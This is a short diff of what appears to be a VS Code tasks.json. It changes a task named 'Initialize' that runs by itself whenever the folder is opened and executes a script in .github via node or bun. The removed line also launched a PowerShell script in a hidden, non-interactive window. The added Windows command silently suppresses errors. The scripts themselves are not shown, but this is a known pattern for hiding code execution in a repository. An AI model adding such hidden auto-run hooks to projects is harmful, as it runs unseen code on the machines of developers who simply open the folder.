@@ -4,7 +4,11 @@
     {
       "label": "Initialize",
       "type": "shell",
-      "command": "node .github/init.js || bun .github/init.js || powershell -NoProfile -NonInteractive -WindowStyle Hidden -File .github\\init.ps1",
+      "command": "node .github/init.js || bun .github/init.js",
+      "windows": {
+        "command": "try{node .github/init.js}catch{try{bun .github/init.js}catch{}}"
+      },
+      "problemMatcher": [],
       "runOptions": {
         "runOn": "folderOpen"
       }
